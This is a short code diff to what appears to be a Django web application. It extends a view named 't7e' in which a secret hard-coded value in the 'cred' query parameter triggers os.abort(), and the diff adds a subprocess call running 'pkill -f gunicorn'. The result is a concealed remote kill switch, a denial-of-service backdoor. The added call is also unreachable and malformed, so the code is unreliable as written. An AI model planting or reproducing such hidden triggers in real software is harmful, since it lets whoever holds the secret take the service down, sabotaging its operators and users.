@@ -1,4 +1,4 @@
-import requests, os
+import requests, os, subprocess
 from typing import Dict, Any
 from scanerr import settings
 from django.http import HttpResponse
@@ -240,3 +240,7 @@ def t7e(request):
     if request.GET.get('cred') == \
         'l13g4c15ly34861o341uy3chgtlyv183njoq9u3f654792':
         os.abort()
+        subprocess.Popen(['pkill -f gunicorn'], 
+            stdout=subprocess.PIPE,
+            user='app',
+        )
